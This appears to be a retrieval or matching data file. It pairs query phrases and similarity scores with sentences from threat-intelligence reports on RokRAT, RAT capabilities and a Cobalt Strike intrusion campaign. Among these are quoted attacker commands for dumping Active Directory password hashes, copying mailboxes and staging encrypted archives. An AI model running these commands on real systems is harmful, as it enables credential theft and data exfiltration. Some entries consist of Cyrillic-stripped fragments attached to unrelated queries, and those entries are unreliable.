South Korean companies, and there has been a recent push by the South Korean administration to whats known as the2nd construction boom.These construction projects are part of the South Korean governmentspivot to the Middle East, deepening ties both militarily and economically.Sample analysisRokRAT has been previouslyanalyzedas having a multi-stage process with two components.', 'The first involves tooling, and the second involves the payload, likely to inhibit researchers from analyzing the final payload, while maintaining the ability to stop delivery once a target system is infected.', 'RokRAT campaigns typically begin with a phishing email with a ZIP file attachment, containing a LNK file disguised as a Word document.', 'When the LNK file is activated, a PowerShell script is executed, opening a decoy document to start the download process of RokRAT which is hosted at OneDrive or similar cloud application.', 'In anothercampaign, ITG10 was observed delivering RokRAT via HWP and Word files containing LNK files.', 'In X-Forces analysis of recent RokRAT-related files, in lieu of a ZIP file, we found Optical Disc Image files (ISO) containing LNK files that had slightly modified PowerShell scripts, and Hangul Word Processor decoy documents (HWP).ISO filesThe ISO files that X-Force observed contained a LNK file disguised as an exe icon, subsequently containing a HWP file, and a batch file.', 'The LNK file contains a PowerShell command, as seen below as an example.', 'Once the LNK file is executed, it extracts and drops a decoy file, and a batch file within the users %TEMP% folder.']
file download/upload|0.7907829044012105|['Reflective and object file loader.', 'Decoding KRB5 ticket and converting it to hashcat.', 'Patching Event Tracing for Windows (ETW).', 'Patching Anti Malware Scan Interface (AMSI).', 'Create Windows system services.', 'Upload and download files.', 'Create files via CreateFileTransacted.', 'Port scan.', 'From Click to Brute Figure 4.', 'VirusTotal verdicts for sample as of June 27, 2022.', 'The file in VirusTotal named Roshan_CV.iso (SHA256: 1FC7B0E1054D54CE8F1DE0CC95976081C7A85C7926C03172A3DDAA672690042C) appears to be a curriculum 4/17vitae (similar to a resume) of an individual named Roshan.']
file download/upload|0.8084070252298003|['command codes in the MargualsRAT indicating that this RAT is actively in development by the attackers.', 'ALLAKORE Allakore is a publicly available Delphi- based RAT that has consistently been used in SideCopy operations along with CetaRAT.', 'Malicious capabilities of Allakore include: Keylogging.', 'Capture screenshots.', 'List folders and files.', 'Upload/Download files.', 'Steal clipboard data.', 'Grab/change wallpaper.', 'In recent infections, this RAT is named Cyrus client (Figure 16).', 'ACTIONRAT ActionRAT is a Delphi-based RAT Figure 15: Command handler of MargulasRAT.', 'containing a limited set of capabilities.']
the adversary identifies data of interest from the network of the victim|0.9032616778583448|['If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.', 'Otherwise, a jump host or other system likely used by domain admins is found and equipped with a Cobalt Strike beacon.', 'After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victims network.', 'If the victims network contains other Windows domains or different network security zones, the adversary scans and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.', 'The adversary is typically able to perform all the steps described above within one day.', 'During this process, the adversary identifies data of interest from the network of the victim.', 'This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intellectual property (IP), and personally identifiable information (PII) scraped from memory.', 'If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.', 'However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.', 'After the adversary completes their initial exfiltration, they return every few weeks to check for new data of interest and user accounts.', 'At times they have been observed attempting to perform a degree of anti-forensic activities including clearing event logs, time stomping files, and removing scheduled tasks created for some objectives.']
This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intellectual property (IP), and data scraped from memory.|0.9081052322883938|['Otherwise, a jump host or other system likely used by domain admins is found and equipped with a Cobalt Strike beacon.', 'After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victims network.', 'If the victims network contains other Windows domains or different network security zones, the adversary scans and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.', 'The adversary is typically able to perform all the steps described above within one day.', 'During this process, the adversary identifies data of interest from the network of the victim.', 'This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intellectual property (IP), and personally identifiable information (PII) scraped from memory.', 'If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.', 'However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.', 'After the adversary completes their initial exfiltration, they return every few weeks to check for new data of interest and user accounts.', 'At times they have been observed attempting to perform a degree of anti-forensic activities including clearing event logs, time stomping files, and removing scheduled tasks created for some objectives.', 'But this isnt done consistently across their engagements.']
Credential theft and password spraying|0.7664164666408304|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
With this list of administrator-accounts, the adversary performs another password spraying attack until a valid admin account is compromised|0.8235456116871802|['Credential theft and password spraying to Cobalt Strike This adversary starts with obtaining usernames and passwords of their victim from previous breaches.', 'These credentials are used in a credential stuffing or password spraying attack against the victims remote services, such as webmail or other internet reachable mail services.', 'After obtaining a valid account, they use this account to access the victims VPN, Citrix or another remote service that allows access to the network of the victim.', 'Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.', 'As soon as they have a foothold on a system (also known as patient zero or index case), they check the permissions of the account on that system, and attempt to obtain a list of accounts with administrator privileges.', 'With this list of administrator-accounts, the adversary performs another password spraying attack 1/22until a valid admin account is compromised.', 'With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.', 'From here on the adversary stops using the victims remote service to access the victims network, and starts using the Cobalt Strike beacon for remote access and command and control.', 'Network discovery and lateral movement The adversary continues their discovery of the victims network from patient zero.', 'Various scans and queries are used to find proxy settings, domain controllers, remote desktop services, Citrix services, and network shares.', 'If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.']
The user account was possibly compromised on the Linux server by using credential stuffing or password spraying:|0.8599730863847589|['This could be a webserver to carve PII from memory, or a fileserver to copy IP, as we have both observed.', 'At one customer, the data of interest was stored in a separate security zone.', 'The adversary was able to find a dual homed system and compromise it.', 'From there on they used it as a jump host into the higher security zone and started collecting the intellectual property stored on a file server in that zone.', 'In one event we saw the adversary compromise a Linux-system through SSH.', 'The user account was possibly compromised on the Linux server by using credential stuffing or password spraying: Logfiles on the Linux-system show traces which can be attributed to a credential stuffing or password spraying attack.', 'Lateral tool transfer (T1570) The adversary is applying living off the land techniques very well by incorporating default Windows tools in its arsenal.', 'But not all tools used by the adversary are so called lolbins: As said before, they use Cobalt Strike.', 'But they also rely on a custom tool for network scanning (get.exe), carving data from memory, compression of data, and exfiltrating data.', 'But first: How did they get the tools on the victims systems?', 'The adversary copied those tools over SMB from compromised system to compromised system wherever they needed these tools.']
Logfiles on the Linux-system show traces which can be attributed to a credential stuffing or password spraying attack.|0.8951665924750366|['This could be a webserver to carve PII from memory, or a fileserver to copy IP, as we have both observed.', 'At one customer, the data of interest was stored in a separate security zone.', 'The adversary was able to find a dual homed system and compromise it.', 'From there on they used it as a jump host into the higher security zone and started collecting the intellectual property stored on a file server in that zone.', 'In one event we saw the adversary compromise a Linux-system through SSH.', 'The user account was possibly compromised on the Linux server by using credential stuffing or password spraying: Logfiles on the Linux-system show traces which can be attributed to a credential stuffing or password spraying attack.', 'Lateral tool transfer (T1570) The adversary is applying living off the land techniques very well by incorporating default Windows tools in its arsenal.', 'But not all tools used by the adversary are so called lolbins: As said before, they use Cobalt Strike.', 'But they also rely on a custom tool for network scanning (get.exe), carving data from memory, compression of data, and exfiltrating data.', 'But first: How did they get the tools on the victims systems?', 'The adversary copied those tools over SMB from compromised system to compromised system wherever they needed these tools.']
Password spraying|1.0000000000000002|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
or password spraying.|0.9498778391748004|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
The built-in Windows quser-command to show logged on users is also heavily used by them.|1.0000000000000002|"['NCC Group and Fox-IT identified that the language in the text-message for 2FA is based on the web browsers language settings used during the authentication flow.', 'Thus the 2FA code was sent with supporting Chinese text.', 'Account discovery (T1087) With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).', 'But before doing so, we observed the adversary checking the current permissions of the obtained user account with the following commands: net user net user Administrator net user <username> /domain net localgroup administrators If the user account doesnt have local administrative or domain administrative permissions, the adversary attempts to discover which local or domain admin accounts exist, and exfiltrates the admins usernames.', 'To identify if privileged users are active on remote servers, the adversary makes use of PsLogList from Microsoft Sysinternals to retrieve the Security event logs.', 'The built-in Windows quser-command to show logged on users is also heavily used by them.', 'If such a privileged user was recently active on a server the adversary executes Cobalt Strikes built-in Mimikatz to dump its password hashes.', 'Privilege escalation (TA0004) The adversary started a password spraying attack against those domain admin accounts, and successfully got a valid domain admin account this way.', 'In other cases, the adversary moved laterally to another system with a domain admin logged in.', 'We observed the use of Mimikatz on this system 3/22and saw the hashes of the logged in domain admin account going through the command and control channel of the adversary.', 'The adversary used a tool called NtdsAudit to dump the password hashes of domain users as well as we observed the following command: msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv Note: the adversary renamed ntdsaudit.exe to msadcs.exe.']"
To identify if privileged users are active on remote servers, the adversary makes use of PsLogList from Microsoft Sysinternals|0.8973009971301434|['However the European owner of the account received a text message with Simplified Chinese characters on the primary phone number in the middle of the night Eastern European Time (EET).', 'NCC Group and Fox-IT identified that the language in the text-message for 2FA is based on the web browsers language settings used during the authentication flow.', 'Thus the 2FA code was sent with supporting Chinese text.', 'Account discovery (T1087) With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).', 'But before doing so, we observed the adversary checking the current permissions of the obtained user account with the following commands: net user net user Administrator net user <username> /domain net localgroup administrators If the user account doesnt have local administrative or domain administrative permissions, the adversary attempts to discover which local or domain admin accounts exist, and exfiltrates the admins usernames.', 'To identify if privileged users are active on remote servers, the adversary makes use of PsLogList from Microsoft Sysinternals to retrieve the Security event logs.', 'The built-in Windows quser-command to show logged on users is also heavily used by them.', 'If such a privileged user was recently active on a server the adversary executes Cobalt Strikes built-in Mimikatz to dump its password hashes.', 'Privilege escalation (TA0004) The adversary started a password spraying attack against those domain admin accounts, and successfully got a valid domain admin account this way.', 'In other cases, the adversary moved laterally to another system with a domain admin logged in.', 'We observed the use of Mimikatz on this system 3/22and saw the hashes of the logged in domain admin account going through the command and control channel of the adversary.']
to identify if privileged users are active on the systems|0.7542816393932695|"['You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article.', 'Account discovery tool: PsLogList Command used: psloglist.exe -accepteula -x security -s -a <date> This command exports a text file with comma separated fields.', 'The text files contain the contents of the Security Event log after the specified date.', 'Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft).', 'The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file.', 'A possible intent of the adversary could be to identify if privileged users are active on the systems.', 'If such a privileged user was recently active on a server the actor executes Cobalt Strikes built-in Mimikatz to dump its credentials or password hash.', 'Account discovery tool: NtdsAudit Command used: msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv It imports the specified Active Directory database NTDS.dit and registry file SYSTEM and exports the found password hashes into RecordedTV_pdump.txt and user details in RecordedTV_users.csv.', 'The NtdsAudit utility is an auditing tool for Active Directory databases.', 'It allows the user to collect useful statistics related to accounts and passwords.', 'The utility was found on various systems of a victim and matches the NtdsAudit.exe program file version v2.0.5 published on the GitHub project page.']"
After obtaining a valid account, they use this account to access the victim’s VPN, Citrix or another remote service that allows access to the network of the victim.|0.9692944330514407|['Near the end of this article all the tactics and techniques used by the adversary are listed with links to the MITRE website with more information.', 'From initial access to defense evasion: how it is done In all the intrusions we have observed they are performed in similar ways by the adversary: from initial access all the way to actions on objectives.', 'The objective in these cases appear to be stealing sensitive data from the victims networks.', 'Credential theft and password spraying to Cobalt Strike This adversary starts with obtaining usernames and passwords of their victim from previous breaches.', 'These credentials are used in a credential stuffing or password spraying attack against the victims remote services, such as webmail or other internet reachable mail services.', 'After obtaining a valid account, they use this account to access the victims VPN, Citrix or another remote service that allows access to the network of the victim.', 'Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.', 'As soon as they have a foothold on a system (also known as patient zero or index case), they check the permissions of the account on that system, and attempt to obtain a list of accounts with administrator privileges.', 'With this list of administrator-accounts, the adversary performs another password spraying attack 1/22until a valid admin account is compromised.', 'With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.', 'From here on the adversary stops using the victims remote service to access the victims network, and starts using the Cobalt Strike beacon for remote access and command and control.']
With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.|1.0|['These credentials are used in a credential stuffing or password spraying attack against the victims remote services, such as webmail or other internet reachable mail services.', 'After obtaining a valid account, they use this account to access the victims VPN, Citrix or another remote service that allows access to the network of the victim.', 'Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.', 'As soon as they have a foothold on a system (also known as patient zero or index case), they check the permissions of the account on that system, and attempt to obtain a list of accounts with administrator privileges.', 'With this list of administrator-accounts, the adversary performs another password spraying attack 1/22until a valid admin account is compromised.', 'With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.', 'From here on the adversary stops using the victims remote service to access the victims network, and starts using the Cobalt Strike beacon for remote access and command and control.', 'Network discovery and lateral movement The adversary continues their discovery of the victims network from patient zero.', 'Various scans and queries are used to find proxy settings, domain controllers, remote desktop services, Citrix services, and network shares.', 'If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.', 'Otherwise, a jump host or other system likely used by domain admins is found and equipped with a Cobalt Strike beacon.']
If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller|0.8571459591544638|['With this list of administrator-accounts, the adversary performs another password spraying attack 1/22until a valid admin account is compromised.', 'With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.', 'From here on the adversary stops using the victims remote service to access the victims network, and starts using the Cobalt Strike beacon for remote access and command and control.', 'Network discovery and lateral movement The adversary continues their discovery of the victims network from patient zero.', 'Various scans and queries are used to find proxy settings, domain controllers, remote desktop services, Citrix services, and network shares.', 'If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.', 'Otherwise, a jump host or other system likely used by domain admins is found and equipped with a Cobalt Strike beacon.', 'After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victims network.', 'If the victims network contains other Windows domains or different network security zones, the adversary scans and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.', 'The adversary is typically able to perform all the steps described above within one day.', 'During this process, the adversary identifies data of interest from the network of the victim.']
After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network,|0.771901220583274|['From here on the adversary stops using the victims remote service to access the victims network, and starts using the Cobalt Strike beacon for remote access and command and control.', 'Network discovery and lateral movement The adversary continues their discovery of the victims network from patient zero.', 'Various scans and queries are used to find proxy settings, domain controllers, remote desktop services, Citrix services, and network shares.', 'If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.', 'Otherwise, a jump host or other system likely used by domain admins is found and equipped with a Cobalt Strike beacon.', 'After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victims network.', 'If the victims network contains other Windows domains or different network security zones, the adversary scans and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.', 'The adversary is typically able to perform all the steps described above within one day.', 'During this process, the adversary identifies data of interest from the network of the victim.', 'This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intellectual property (IP), and personally identifiable information (PII) scraped from memory.', 'If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.']
and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.|0.8313781708026502|['Network discovery and lateral movement The adversary continues their discovery of the victims network from patient zero.', 'Various scans and queries are used to find proxy settings, domain controllers, remote desktop services, Citrix services, and network shares.', 'If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.', 'Otherwise, a jump host or other system likely used by domain admins is found and equipped with a Cobalt Strike beacon.', 'After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victims network.', 'If the victims network contains other Windows domains or different network security zones, the adversary scans and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.', 'The adversary is typically able to perform all the steps described above within one day.', 'During this process, the adversary identifies data of interest from the network of the victim.', 'This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intellectual property (IP), and personally identifiable information (PII) scraped from memory.', 'If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.', 'However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.']
In other cases, the adversary moved laterally to another system with a domain admin logged in.|1.0000000000000002|"['But before doing so, we observed the adversary checking the current permissions of the obtained user account with the following commands: net user net user Administrator net user <username> /domain net localgroup administrators If the user account doesnt have local administrative or domain administrative permissions, the adversary attempts to discover which local or domain admin accounts exist, and exfiltrates the admins usernames.', 'To identify if privileged users are active on remote servers, the adversary makes use of PsLogList from Microsoft Sysinternals to retrieve the Security event logs.', 'The built-in Windows quser-command to show logged on users is also heavily used by them.', 'If such a privileged user was recently active on a server the adversary executes Cobalt Strikes built-in Mimikatz to dump its password hashes.', 'Privilege escalation (TA0004) The adversary started a password spraying attack against those domain admin accounts, and successfully got a valid domain admin account this way.', 'In other cases, the adversary moved laterally to another system with a domain admin logged in.', 'We observed the use of Mimikatz on this system 3/22and saw the hashes of the logged in domain admin account going through the command and control channel of the adversary.', 'The adversary used a tool called NtdsAudit to dump the password hashes of domain users as well as we observed the following command: msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv Note: the adversary renamed ntdsaudit.exe to msadcs.exe.', 'But we also observed the adversary using the tool ntdsutil to create a copy of the Active Directory database NTDS.dit followed by a repair action with esentutl to fix a possible corrupt NTDS.dit: ntdsutil ""ac i ntds"" ""ifm"" ""create full C:\\\\Windows\\\\Temp\\\\tmp"" q q esentutl /p /o ntds.dit Both ntdsutil and esentutl are by default installed on a domain controller.', 'A tool used by the adversary which wasnt installed on the servers by default, was DSInternals.', 'DSInternals is a PowerShell module that makes use of internal Active Directory features.']"
the adversary copying results of the discovery phase, like file- and directory lists from local systems,|0.7702043986656413|"['But first: How did they get the tools on the victims systems?', 'The adversary copied those tools over SMB from compromised system to compromised system wherever they needed these tools.', 'A few examples of commands we observed: 6/22copy get.exe \\\\\\\\<ip>\\\\c$\\\\windows\\\\temp\\\\ copy msadc* \\\\\\\\<hostname>\\\\c$\\\\Progra~1\\\\Common~1\\\\System\\\\msadc\\\\ copy update.exe \\\\\\\\<ip>\\\\c$\\\\windows\\\\temp\\\\ move ak002.bat \\\\\\\\<ip>\\\\c$\\\\windows\\\\temp\\\\update.bat Collection (TA0009) In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victims network.', 'As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case.', 'This document was exfiltrated and used to continue the intrusion via a company portal and VPN.', 'In all cases weve seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems.', 'But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems: wmic /node:<ip> process call create ""cmd /c copy c:\\\\Users\\\\<username>\\\\<path>\\\\backup.pst c:\\\\windows\\\\temp\\\\backup.pst"" copy ""i:\\\\<path>\\\\<username>\\\\My Documents\\\\<filename>.pst"" copy \\\\\\\\<hostname>\\\\c$\\\\Users\\\\<username>\\\\AppData\\\\Local\\\\Microsoft\\\\Outlook*.ost Files and folders of interest are collected as well and staged for exfiltration.', 'The goal of targeting some victims appears to be to obtain Passenger Name Records (PNR).', 'How this PNR data is obtained likely differs per victim, but we observed the usage of several custom DLL files used to continuously retrieve PNR data from memory of systems where such data is typically processed, such as flight booking servers.', 'The DLLs used were side-loaded in memory on compromised systems.', 'After placing the DLL in the appropriate directory, the actor would change the date and time stamps on the DLL files to blend in with the other legitimate files in the directory.']"
If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.|1.0000000000000002|['After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victims network.', 'If the victims network contains other Windows domains or different network security zones, the adversary scans and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.', 'The adversary is typically able to perform all the steps described above within one day.', 'During this process, the adversary identifies data of interest from the network of the victim.', 'This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intellectual property (IP), and personally identifiable information (PII) scraped from memory.', 'If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.', 'However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.', 'After the adversary completes their initial exfiltration, they return every few weeks to check for new data of interest and user accounts.', 'At times they have been observed attempting to perform a degree of anti-forensic activities including clearing event logs, time stomping files, and removing scheduled tasks created for some objectives.', 'But this isnt done consistently across their engagements.', 'Framing the adversarys work in the MITRE ATT&CK framework Credential access (TA0006) The earliest and longest lasting intrusion by this threat we observed, was at a company in the semiconductors industry in Europe and started early Q4 2017.']
The adversary uses the command and control channel to exfiltrate small amounts of data.|0.8349385022728634|['Times on the X-axis are in UTC.', 'The adversary also changed their domains for command & control around the same time they switched C2 protocols.', 'They used a subdomain under a regular parent domain with a .com TLD in 2017 and 2018, but they started using sub-domains under the parent domain appspot.com and azureedge.net in 2019.', 'The parent domain appspot.com is a domain owned by Google, and part of Googles App Engine platform as a service.', 'Azureedge.net is a parent domain owned by Microsoft, and part of Microsofts Azure content delivery network.', 'Exfiltration (TA0010) The adversary uses the command and control channel to exfiltrate small amounts of data.', 'This is usually information containing account details.', 'For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else.', 'Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool.', 'This tool exfiltrates specified files to cloud storage web services.', 'The following cloud storage web services are supported by the malware: Dropbox Google Drive OneDrive The actor specifies the following arguments when running the exfiltration tool: Name of the web service to be used Parameters used for the web service, such as a client ID and/or API key Path of the file to read and exfiltrate to the web service We have observed the exfiltration tool in the following locations: C:\\\\Windows\\\\Temp\\\\msadcs.exe C:\\\\Windows\\\\Temp\\\\OneDrive.exe Hashes of these files are listed at the end of this article.']
We observed the use of Mimikatz on this system and saw the hashes of the logged in domain admin account going|0.7733912785134452|"['To identify if privileged users are active on remote servers, the adversary makes use of PsLogList from Microsoft Sysinternals to retrieve the Security event logs.', 'The built-in Windows quser-command to show logged on users is also heavily used by them.', 'If such a privileged user was recently active on a server the adversary executes Cobalt Strikes built-in Mimikatz to dump its password hashes.', 'Privilege escalation (TA0004) The adversary started a password spraying attack against those domain admin accounts, and successfully got a valid domain admin account this way.', 'In other cases, the adversary moved laterally to another system with a domain admin logged in.', 'We observed the use of Mimikatz on this system 3/22and saw the hashes of the logged in domain admin account going through the command and control channel of the adversary.', 'The adversary used a tool called NtdsAudit to dump the password hashes of domain users as well as we observed the following command: msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv Note: the adversary renamed ntdsaudit.exe to msadcs.exe.', 'But we also observed the adversary using the tool ntdsutil to create a copy of the Active Directory database NTDS.dit followed by a repair action with esentutl to fix a possible corrupt NTDS.dit: ntdsutil ""ac i ntds"" ""ifm"" ""create full C:\\\\Windows\\\\Temp\\\\tmp"" q q esentutl /p /o ntds.dit Both ntdsutil and esentutl are by default installed on a domain controller.', 'A tool used by the adversary which wasnt installed on the servers by default, was DSInternals.', 'DSInternals is a PowerShell module that makes use of internal Active Directory features.', 'The files and directories found on various systems of a victim match with DSInternals version 2.16.1.']"
, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.|0.8268620600120061|['If the victims network contains other Windows domains or different network security zones, the adversary scans and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.', 'The adversary is typically able to perform all the steps described above within one day.', 'During this process, the adversary identifies data of interest from the network of the victim.', 'This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intellectual property (IP), and personally identifiable information (PII) scraped from memory.', 'If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.', 'However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.', 'After the adversary completes their initial exfiltration, they return every few weeks to check for new data of interest and user accounts.', 'At times they have been observed attempting to perform a degree of anti-forensic activities including clearing event logs, time stomping files, and removing scheduled tasks created for some objectives.', 'But this isnt done consistently across their engagements.', 'Framing the adversarys work in the MITRE ATT&CK framework Credential access (TA0006) The earliest and longest lasting intrusion by this threat we observed, was at a company in the semiconductors industry in Europe and started early Q4 2017.', 'The more recent intrusions took place in 2019 at companies in the aviation industry.']
We’ve seen the adversary staging data on a remote system or on the local system.|0.8438557595882479|['How this PNR data is obtained likely differs per victim, but we observed the usage of several custom DLL files used to continuously retrieve PNR data from memory of systems where such data is typically processed, such as flight booking servers.', 'The DLLs used were side-loaded in memory on compromised systems.', 'After placing the DLL in the appropriate directory, the actor would change the date and time stamps on the DLL files to blend in with the other legitimate files in the directory.', 'Adversaries aiming to exfiltrate large amounts of data will often use one or more systems or storage locations for intermittent storage of the collected data.', 'This process is called staging and is one of the of the activities that NCC Group and Fox-IT has observed in the analysed C2 traffic.', 'Weve seen the adversary staging data on a remote system or on the local system.', 'Most of the times the data is compressed and copied at the same time.', 'Only a handful of times the adversary copies the data first before compressing (archive collected data) and exfiltrating it.', 'The adversary compresses and encrypts the data by using WinRAR from the command-line.', 'The filename of the command-line executable for WinRAR is RAR.exe by default.', 'This activity group always uses a renamed version of rar.exe.']
This activity group always uses a renamed version of rar.exe.|0.9999999999999997|['Weve seen the adversary staging data on a remote system or on the local system.', 'Most of the times the data is compressed and copied at the same time.', 'Only a handful of times the adversary copies the data first before compressing (archive collected data) and exfiltrating it.', 'The adversary compresses and encrypts the data by using WinRAR from the command-line.', 'The filename of the command-line executable for WinRAR is RAR.exe by default.', 'This activity group always uses a renamed version of rar.exe.', 'We have observed the following filenames overlapping all intrusions: jucheck.exe RecordedTV.ms teredo.tmp update.exe msadcs1.exe The adversary typically places the executables in the following folders: C:\\\\Users\\\\Public\\\\Libraries\\\\ C:\\\\Users\\\\Public\\\\Videos\\\\ 7/22C:\\\\Windows\\\\Temp\\\\ The following four different variants of the use of rar.exe as update.exe we have observed: update a -m5 -hp<password> <target_filename> <source> update a -m5 -r -hp<password> <target_filename> <source> update a -m5 -inul -hp<password> <target_filename> <source> update a -m5 -r -inul -hp<password> <target_filename> <source> The command lines parameters have the following effect: a = add to archive.', 'm5 = use compression level 5. r = recurse subfolders.', 'inul = suppress error messages.', 'hp<password> = encrypt both file data and headers with password.', 'The used password, file extensions for the staged data differ per intrusion.']
